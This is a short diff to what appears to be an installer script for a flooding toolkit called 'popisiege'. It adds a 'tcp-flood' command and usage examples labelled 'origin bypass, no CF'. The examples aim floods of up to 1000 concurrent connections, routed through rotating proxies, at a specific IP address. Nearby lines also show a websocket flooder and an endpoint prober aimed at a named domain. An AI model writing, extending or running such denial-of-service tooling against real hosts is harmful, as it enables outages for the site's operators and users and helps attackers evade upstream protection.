@@ -93,6 +93,9 @@ _make_cmd /usr/local/bin/feed-flood-ws \
 _make_cmd /usr/local/bin/buffalo-probe \
     "exec python3 /opt/popisiege/buffalo_probe.py \"\$@\""
 
+_make_cmd /usr/local/bin/tcp-flood \
+    "exec python3 /opt/popisiege/tcp_flood.py \"\$@\""
+
 # ── done ───────────────────────────────────────────────────────────────────────
 echo ""
 echo -e "${B}=============================="
@@ -131,6 +134,11 @@ echo -e "  ${B}Buffalo Probe (endpoint discovery):${W}"
 echo    "    buffalo-probe"
 echo    "    buffalo-probe --target metoo-shatkin.com"
 echo    "    buffalo-probe --workers 20"
+echo ""
+echo -e "  ${B}TCP Connection Flood (origin bypass, no CF):${W}"
+echo    "    tcp-flood --target 104.236.194.226"
+echo    "    tcp-flood --target 104.236.194.226 --webshare --concurrency 500"
+echo    "    tcp-flood --target 104.236.194.226 --concurrency 1000 --hold 30"
 echo ""
 echo -e "  ${B}Defense monitor:${W}"
 echo    "    popiwatch --log /var/log/nginx/access.log"
